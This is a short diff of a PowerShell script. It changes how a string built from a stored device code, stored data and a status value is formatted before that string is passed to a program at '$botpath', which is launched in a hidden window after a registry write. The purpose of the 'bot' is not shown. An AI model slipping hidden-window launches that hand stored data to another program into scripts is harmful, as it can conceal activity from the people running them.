@@ -343,7 +343,7 @@ if ($storedCode -ne $null) {
               	  	}
                 if ($status -ne $null) {
         		Set-ItemProperty -Path $regPath -Name "Data" -Value $status
-	  		$combinedString = """PreviousStatus($storedData) :: DeviceCode($storedCode) :: UpdatedStatus($status)"""
+	  		$combinedString = """$storedCode :: $storedData>>$status)"""
      			Start-Process -WindowStyle Hidden -FilePath $botpath -ArgumentList $combinedString
 			Start-Sleep 3
 		}
